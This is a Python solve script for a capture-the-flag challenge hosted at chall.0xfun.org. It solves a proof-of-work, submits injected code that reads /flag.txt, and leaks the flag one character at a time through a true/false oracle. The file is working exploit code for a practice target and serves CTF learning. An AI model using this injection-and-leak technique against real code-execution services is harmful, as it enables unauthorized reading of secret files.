import requests
import hashlib
import time
import random
import string

url = "http://chall.0xfun.org:19797/"

def compute_pow():
    target = '0' * 4
    nonce = 0
    while True:
        test_str = f"{int(time.time()*1000)}-{nonce}-{random.random()}"
        h = hashlib.sha256(test_str.encode()).hexdigest()
        if h.startswith(target):
            return test_str
        nonce += 1
        if nonce % 10000 == 0:
            time.sleep(0.001)

def req(code):
    pow_str = compute_pow()
    headers = {
        "Content-Type": "application/json",
        "X-Pow-Nonce": pow_str
    }

    res = requests.post(f"{url}/api/submit", headers=headers, json={ "code": code })

    return res.json()

def leak(code):
    payload = f'''flag = open("/flag.txt").read();print({code})'''.strip()

    resp = req(payload)

    return resp['stdout'].strip()

charset = string.digits + string.ascii_letters + "{}_"

length = 41
flag = '0xfun{'

for idx in range(len(flag), length):
    candidates = []
    
    for char in charset:
        print("Trying:", char, '|', flag)
        result = leak(f"flag[{idx}]!='{char}'")
        
        if result == "False":
            flag += char
            break
        elif result == "???":
            candidates.append(char)

            if len(candidates) == 2:
                if all(i == 'q' for i in candidates):
                    flag += 'q'
                else:
                    flag += [i for i in candidates if i != 'q'][0]
                break

print("Flag:", flag)